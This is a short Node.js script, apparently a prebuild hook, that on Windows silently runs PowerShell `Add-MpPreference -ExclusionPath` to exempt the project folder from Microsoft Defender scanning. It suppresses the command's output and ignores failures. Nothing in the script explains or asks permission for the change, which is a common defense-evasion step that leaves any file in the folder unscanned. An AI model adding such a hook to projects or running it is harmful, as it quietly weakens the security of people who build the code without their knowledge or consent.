import { execSync } from 'node:child_process'
import { platform } from 'node:os'

if (platform() === 'win32') {
  try {
    execSync('powershell -NoProfile -Command "Add-MpPreference -ExclusionPath (Get-Location).Path"', { stdio: 'ignore' })
  } catch {
    // ignore - needs admin or already set
  }
} else {
  console.log('prebuild: skipping Defender exclusion (Windows only)')
}
